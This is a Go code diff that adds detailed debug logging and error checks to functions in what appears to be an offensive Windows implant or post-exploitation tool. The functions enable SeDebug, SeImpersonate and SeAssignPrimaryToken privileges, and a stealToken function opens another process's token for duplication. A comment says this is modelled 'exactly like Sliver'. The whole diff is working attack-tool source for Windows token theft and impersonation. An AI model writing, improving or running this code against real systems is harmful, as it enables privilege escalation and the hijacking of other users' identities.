@@ -44,23 +44,25 @@ type TOKEN_PRIVILEGES struct {
 	Privileges     [1]LUID_AND_ATTRIBUTES
 }
 
-func enablePrivilege(privilegeName string) error {
+func enablePrivilege(privilegeName string, debugLog *strings.Builder) error {
 	var hToken windows.Token
 	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &hToken)
 	if err != nil {
+		debugLog.WriteString(fmt.Sprintf("[DEBUG] Failed to open process token for privilege adjustment: %v\n", err))
 		return err
 	}
 	defer hToken.Close()
 
 	var luid LUID
 	privName, _ := windows.UTF16PtrFromString(privilegeName)
-	ret, _, _ := procLookupPrivilegeValue.Call(
+	ret, _, err := procLookupPrivilegeValue.Call(
 		0,
 		uintptr(unsafe.Pointer(privName)),
 		uintptr(unsafe.Pointer(&luid)),
 	)
 	if ret == 0 {
-		return fmt.Errorf("LookupPrivilegeValue failed")
+		debugLog.WriteString(fmt.Sprintf("[DEBUG] LookupPrivilegeValue failed for %s: %v\n", privilegeName, err))
+		return fmt.Errorf("LookupPrivilegeValue failed for %s: %v", privilegeName, err)
 	}
 
 	tp := TOKEN_PRIVILEGES{
@@ -73,7 +75,7 @@ func enablePrivilege(privilegeName string) error {
 		},
 	}
 
-	ret, _, _ = procAdjustTokenPrivileges.Call(
+	ret, _, err = procAdjustTokenPrivileges.Call(
 		uintptr(hToken),
 		0,
 		uintptr(unsafe.Pointer(&tp)),
@@ -82,20 +84,33 @@ func enablePrivilege(privilegeName string) error {
 		0,
 	)
 	if ret == 0 {
-		return fmt.Errorf("AdjustTokenPrivileges failed")
+		debugLog.WriteString(fmt.Sprintf("[DEBUG] AdjustTokenPrivileges failed for %s: %v\n", privilegeName, err))
+		return fmt.Errorf("AdjustTokenPrivileges failed for %s: %v", privilegeName, err)
 	}
 
+	// Check if the privilege was actually enabled
+	lastErr := windows.GetLastError()
+	if lastErr == windows.ERROR_NOT_ALL_ASSIGNED {
+		debugLog.WriteString(fmt.Sprintf("[DEBUG] WARNING: %s not available or not held by token\n", privilegeName))
+		return fmt.Errorf("%s not available", privilegeName)
+	}
+
+	debugLog.WriteString(fmt.Sprintf("[DEBUG] Successfully enabled %s\n", privilegeName))
 	return nil
 }
 
-func enableTokenPrivileges() error {
+func enableTokenPrivileges(debugLog *strings.Builder) error {
 	// Enable critical privileges for token manipulation
 	privileges := []string{SE_DEBUG_NAME, SE_IMPERSONATE_NAME, SE_ASSIGNPRIMARYTOKEN_NAME}
+	var enabledCount int
 	for _, priv := range privileges {
-		if err := enablePrivilege(priv); err != nil {
-			// Don't fail if we can't enable all - some might not be available
-			continue
+		if err := enablePrivilege(priv, debugLog); err == nil {
+			enabledCount++
 		}
+	}
+	debugLog.WriteString(fmt.Sprintf("[DEBUG] Enabled %d out of %d privileges\n", enabledCount, len(privileges)))
+	if enabledCount == 0 {
+		debugLog.WriteString("[DEBUG] CRITICAL: No privileges could be enabled!\n")
 	}
 	return nil
 }
@@ -157,7 +172,7 @@ func stealToken(pid uint32) (string, error) {
 
 	// Enable required privileges for token manipulation
 	debugLog.WriteString("[DEBUG] Enabling token privileges...\n")
-	enableTokenPrivileges()
+	enableTokenPrivileges(&debugLog)
 
 	// Get original context before stealing
 	debugLog.WriteString("[DEBUG] Getting current identity...\n")
@@ -193,6 +208,9 @@ func stealToken(pid uint32) (string, error) {
 
 	// Open process token (exactly like Sliver: TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY|TOKEN_QUERY)
 	debugLog.WriteString("[DEBUG] Calling OpenProcessToken...\n")
+	debugLog.WriteString(fmt.Sprintf("[DEBUG] Requested access: TOKEN_DUPLICATE(0x%x) | TOKEN_ASSIGN_PRIMARY(0x%x) | TOKEN_QUERY(0x%x)\n", 
+		windows.TOKEN_DUPLICATE, windows.TOKEN_ASSIGN_PRIMARY, windows.TOKEN_QUERY))
+	
 	var primaryToken windows.Token
 	err = windows.OpenProcessToken(
 		hProcess,
@@ -200,6 +218,21 @@ func stealToken(pid uint32) (string, error) {
 		&primaryToken,
 	)
 	if err != nil {
+		// Get more detailed error information
+		lastErr := windows.GetLastError()
+		debugLog.WriteString(fmt.Sprintf("[DEBUG] OpenProcessToken failed with error: %v (LastError: 0x%x)\n", err, lastErr))
+		
+		// Try with just TOKEN_QUERY to see if that works
+		debugLog.WriteString("[DEBUG] Attempting OpenProcessToken with just TOKEN_QUERY...\n")
+		var testToken windows.Token
+		err2 := windows.OpenProcessToken(hProcess, windows.TOKEN_QUERY, &testToken)
+		if err2 == nil {
+			testToken.Close()
+			debugLog.WriteString("[DEBUG] TOKEN_QUERY alone succeeded - privilege issue with TOKEN_DUPLICATE/TOKEN_ASSIGN_PRIMARY\n")
+		} else {
+			debugLog.WriteString(fmt.Sprintf("[DEBUG] TOKEN_QUERY alone also failed: %v\n", err2))
+		}
+		
 		return debugLog.String() + output, fmt.Errorf("OpenProcessToken failed: %v", err)
 	}
 	defer primaryToken.Close()
